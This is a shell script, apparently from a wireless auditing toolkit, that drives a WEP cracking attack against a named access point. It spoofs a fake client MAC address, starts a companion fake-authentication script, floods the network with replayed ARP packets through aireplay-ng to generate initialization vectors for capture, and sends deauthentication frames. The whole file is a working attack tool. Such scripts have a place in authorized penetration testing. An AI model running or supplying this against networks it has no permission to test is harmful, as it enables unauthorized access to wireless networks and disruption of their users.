#!/bin/sh

if [ $# -lt 2 ]; then
	echo "Usage: $0 <AP BSSID> <SSID>"
	echo "This application will force a WEP-based client-AP conversation"
	echo "to generate the iv's needed for capture when no client is"
	echo "currently associated. "
	echo "It should be used in tandem with wireless.wep_capture_ivs.sh "
	echo "to capture data."
	echo " "
	echo "<AP BSSID>   can be discovered through wireless.display_aps.sh"
	echo "             in the top section."
	echo "<SSID>       SSID of network to test.  E.g.: linksys"
	echo "All BSSID/Macs are of the format 01:02:03:04:05:06"
	echo " "
	echo "Once run, you should see data increasing in "
	echo "wireless.web_capture_ivs.sh (airodump)"
	exit 1
fi

APMAC=$1
# Fake client mac
CLIENTMAC="00:06:25:c1:E5:38"
SSID=$2

# MONINTERFACE=`iwconfig 2> /dev/null | grep  -B 1 "Mode:Monitor" | grep -Eio --max-count=1 "^.*?IEEE" | sed "s|\sIEEE||" | sed "s|\s||"`
MONINTERFACE=`iwconfig 2> /dev/null | grep  -B 1 "Mode:Monitor" | grep -Eio "^[a-z,A-Z,0-9]{3,7}" | sed "s|\sIEEE||" | sed "s|\s||"`

if [ ${#MONINTERFACE} -gt 0 ]; then
	# Fake auth every 30 seconds.  -D says don't wait for a beacon / don't detect AP's presence
	echo "Fake authenticating..."
	ps -A | grep -i "wireless.wep_fa" > /dev/null

	if [ $? -gt 0 ]; then
		# fakeauth is not running
		if [ -e wireless.wep_fakeauth.sh ]; then
			./wireless.wep_fakeauth.sh $APMAC $SSID&
		else
			wireless.wep_fakeauth.sh $APMAC $SSID&
		fi
	else
		echo "detected fakeauth running.  Proceeding..."
	fi
	# Send 512 ARP's/sec
	echo "Sending ARP's..."
	aireplay-ng --arpreplay -b $APMAC -h $CLIENTMAC -x 512 $MONINTERFACE
	# Deauth the client
	echo "Deauthenticating fake client..."	
	aireplay-ng --deauth 5 -a $APMAC -c $CLIENTMAC $MONINTERFACE
else
	if [ $VERBOSE -eq 1 ]; then
		echo "ERROR: No monitoring interface configured."
	fi
fi

